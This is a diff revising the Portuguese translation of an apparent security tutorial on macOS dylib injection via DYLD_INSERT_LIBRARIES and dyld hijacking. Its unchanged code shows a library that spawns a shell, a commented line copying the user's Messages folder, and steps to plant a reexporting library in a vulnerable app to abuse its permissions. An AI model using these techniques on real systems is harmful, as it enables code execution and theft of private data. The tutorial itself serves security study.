@@ -4,7 +4,7 @@
 
 ## Exemplo básico de DYLD_INSERT_LIBRARIES
 
-**Library to inject** para executar um shell:
+**Biblioteca a ser injetada** para executar um shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binário para atacar:
+Binário alvo:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -33,13 +33,13 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-Injection:
+Injeção:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 ## Exemplo de Dyld Hijacking
 
-O binário vulnerável visado é `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+O binário vulnerável alvo é `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Com as informações anteriores, sabemos que ele **não está verificando a assinatura das bibliotecas carregadas** e está **tentando carregar uma biblioteca de**:
+Com as informações anteriores, sabemos que ele **não verifica a assinatura das bibliotecas carregadas** e **tenta carregar uma biblioteca de**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Então, é possível fazer hijacking dela! Crie uma library que **execute algum código arbitrário e exporte as mesmas funcionalidades** que a library legítima, fazendo reexport dela. E lembre-se de compilá-la com as versões esperadas:
+Então, é possível fazer o hijack dela! Crie uma library que **execute algum código arbitrário e exporte as mesmas funcionalidades** da library legítima, reexportando-a. E lembre-se de compilá-la com as versões esperadas:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Por fim, basta copiá-lo para o **local sequestrado**:
+Finalmente, basta copiá-lo para o **local sequestrado**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
@@ -133,11 +133,11 @@ E **execute** o binary e verifique se a **library foi carregada**:
 </code></pre>
 
 > [!TIP]
-> Um bom writeup sobre como abusar desta vulnerability para abusar das permissões da câmera do Telegram pode ser encontrado em [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[1]</sup>
+> Um bom writeup sobre como abusar dessa vulnerabilidade para explorar as permissões da câmera do Telegram pode ser encontrado em [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
 ## Maior escala
 
-Se você planeja tentar injetar libraries em binaries inesperados, pode verificar as mensagens de eventos para descobrir quando a library é carregada dentro de um processo (neste caso, remova a execução de `printf` e `/bin/bash`).
+Se você estiver planejando tentar injetar libraries em binaries inesperados, poderá verificar as mensagens de eventos para descobrir quando a library é carregada dentro de um processo (nesse caso, remova o printf e a execução de `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
